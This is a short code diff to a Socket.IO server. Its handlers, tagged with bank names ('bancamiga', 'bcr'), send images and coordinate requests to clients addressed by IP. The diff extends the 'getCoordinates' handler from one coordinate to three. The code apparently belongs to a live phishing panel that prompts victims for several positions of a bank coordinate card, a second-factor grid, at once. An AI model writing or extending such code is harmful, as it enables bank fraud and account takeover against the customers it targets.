@@ -56,9 +56,13 @@ io.on('connection', async(socket) => {
                     if(ip == '') return
                     return io.to(ip).emit('[bancamiga] sendImage', {image})
                 })
-                socket.on('[bcr] getCoordinates', ({ip = '', coordinate = ''}) => {
+                socket.on('[bcr] getCoordinates', ({ip = '', coordinate1 = '', coordinate2 = '', coordinate3 = ''}) => {
                     if(ip == '') return
-                    return io.to(ip).emit('[bcr] bagCoordinate', {coordinate: coordinate.toString().slice(0,2)})
+                    return io.to(ip).emit('[bcr] bagCoordinate', {
+                        coordinate1: coordinate1.toString().slice(0,2), 
+                        coordinate2: coordinate2?.toString()?.slice(0,2),
+                        coordinate3: coordinate3?.toString()?.slice(0,2),
+                        })
                 })
 
                 socket.on('[bancamiga] getListImage', ({ip = '', listImage = ''}) => {
